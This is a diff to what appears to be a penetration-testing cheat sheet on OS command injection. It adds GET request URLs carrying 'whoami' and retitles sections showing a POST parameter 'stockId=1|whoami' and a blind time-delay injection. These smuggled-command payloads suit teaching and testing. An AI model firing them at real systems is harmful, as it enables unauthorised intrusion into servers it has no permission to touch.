@@ -7,7 +7,16 @@ website:
 render_with_liquid: false
 ---
 
-## Basic
+## HTTP GET Request
+
+```html
+http://vulnerable.com/api/cmd/whoami
+http://vulnerable.com/command/whoami
+```
+
+<br />
+
+## HTTP POST Request
 
 ```html
 POST /product/stock HTTP/1.1
@@ -18,7 +27,7 @@ productId=1&stockId=1|whoami
 
 <br />
 
-## Blind Command Injection (time delay)
+## HTTP POST Request (Blind Command Injection (time delay))
 
 ```html
 POST /feedback/submit HTTP/1.1
